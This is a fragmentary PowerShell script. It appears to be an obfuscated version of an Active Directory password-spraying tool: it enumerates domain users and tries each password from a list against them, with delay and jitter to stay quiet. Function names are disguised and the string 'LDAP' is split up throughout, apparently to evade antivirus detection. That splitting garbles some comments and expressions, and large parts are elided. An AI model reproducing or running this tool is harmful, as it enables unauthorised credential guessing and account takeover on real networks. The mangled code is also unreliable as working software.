function Invoke-Sagi{
    ...
    try
    {
        if ($Domain -ne "")
        {
            ...
            $CurrentDomain = "LD" + "AP://" + ([ADSI]"LD" + "AP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LD" + "AP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
    ...
    {
        sAGIdINAR -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
    }
    else
    {
        for($i = 0; $i -lt $Passwords.count; $i++)
        {
            sAGIdINAR -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
...
<#
    ...
    Custom LD" + "AP filter for users, e.g. "(description=*admin*)"
    ...
    try
    {
        if ($Domain -ne "")
        {
            ...
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LD" + "AP://" + ([ADSI]"LD" + "AP://$Do" + "main").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
    ...
    $objDeDomain = [ADSI] "LD" + "AP://$($DomainObject.PDCRoleOwner)"
    ...
    if ($RemoveDisabled)
    {
        ...
        # More precise LD" + "AP filter UAC check for users that are disabled (Joff Thyer)
        # LD" + "AP 1.2.840.113556.1.4.803 means bitwise &
